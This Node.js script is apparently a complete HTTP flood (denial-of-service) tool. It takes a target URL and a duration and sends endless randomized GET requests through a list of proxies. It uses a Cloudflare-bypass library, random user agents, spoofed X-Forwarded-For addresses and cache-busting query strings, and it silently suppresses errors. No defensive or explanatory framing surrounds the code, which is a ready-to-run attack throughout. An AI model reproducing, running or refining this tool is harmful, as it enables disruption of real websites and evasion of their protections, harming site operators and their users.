require('events').EventEmitter.defaultMaxListeners = 0;
const CloudflareBypasser = require('cloudflare-bypasser');
const cryptoRandomString = require('crypto-random-string');
const path = require('path');
const fs = require('fs');
var colors = require('colors');
var random_useragent = require('random-useragent');
let cf = new CloudflareBypasser();

if (process.argv.length !== 4) {
    console.log(`
`);
	Array.prototype.random = function (length) {return this[Math.floor((Math.random()*length))];}
	var color = ['yellow', 'cyan', 'magenta', 'red', 'green', 'blue', 'rainbow']
	var rcolor = color.random(color.length)
	console.log(("GO BRR")[rcolor]);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3];
console.log("Attack Sent!")
let proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
function randomNumber(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function send_req() {
	let proxy = proxies[Math.floor(Math.random() * proxies.length)];
		var Array_method = ['GET'];
		var randommethod = Array_method[Math.floor(Math.random()*Array_method.length)];
		cf.request({
			method: randommethod,
			resolveWithFullResponse: true,
			headers: {'User-Agent': random_useragent.getRandom(),'Referer': target,'Connection':'Keep-Alive','Keep-Alive': 'timeout=10, max=100','X-Forwarded-For': randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255),},
			proxy: 'http://' + proxy,
			uri: target + '?' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 16}),
		}).then(res => {});	}

setInterval(() => {
	send_req();
});

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

process.on('uncaughtException', function (err) {
   
});
process.on('unhandledRejection', function (err) {
   
});
